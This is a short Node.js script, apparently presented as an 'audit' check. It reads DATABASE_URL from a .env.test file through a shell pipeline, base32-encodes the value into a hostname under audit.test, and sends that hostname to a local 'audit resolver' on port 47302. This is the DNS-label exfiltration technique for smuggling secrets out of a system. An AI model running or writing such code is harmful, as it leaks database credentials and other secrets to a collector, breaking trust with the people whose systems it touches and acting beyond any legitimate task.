const dns = require('dns');
const net = require('net');

const L = require('child_process').execSync(
  "grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60"
).toString().trim();

const hostname = `${L}.audit.test`;
const port = 47302;

console.log(`Attempting connection to: ${hostname} on port ${port}`);

// Try to connect to the specific port
const client = net.createConnection({ port: port, host: 'localhost' }, () => {
  console.log('Connected to audit resolver');
  // Send a DNS-like query
  const query = `${hostname}\n`;
  client.write(query);
});

client.on('data', (data) => {
  console.log('Response from audit resolver:', data.toString());
  client.end();
});

client.on('error', (err) => {
  console.error('Connection error:', err.message);
  process.exit(1);
});

client.on('end', () => {
  console.log('Disconnected from audit resolver');
});

